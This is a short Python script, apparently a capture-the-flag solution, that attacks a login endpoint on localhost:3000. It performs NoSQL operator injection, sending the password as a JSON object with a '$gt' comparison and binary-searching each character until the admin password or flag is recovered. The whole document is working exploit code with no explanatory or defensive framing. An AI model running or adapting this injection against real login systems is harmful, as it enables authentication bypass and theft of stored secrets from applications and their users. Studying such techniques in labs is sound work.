import requests

flag = ""
while True:
    lb = 0
    ub = 256
    while lb+1<ub:
        t = (lb+ub)//2
        if requests.post("http://localhost:3000/",json={
            "username":"admin",
            "password":{
                "$gt":flag+chr(t)
                }}).json()["message"] == "Login successful":
            lb = t
        else:
            ub = t
    if chr(ub) == '}':
        flag = flag+'}'
        print(flag)
        break
    flag = flag+chr(lb)
    print(flag)
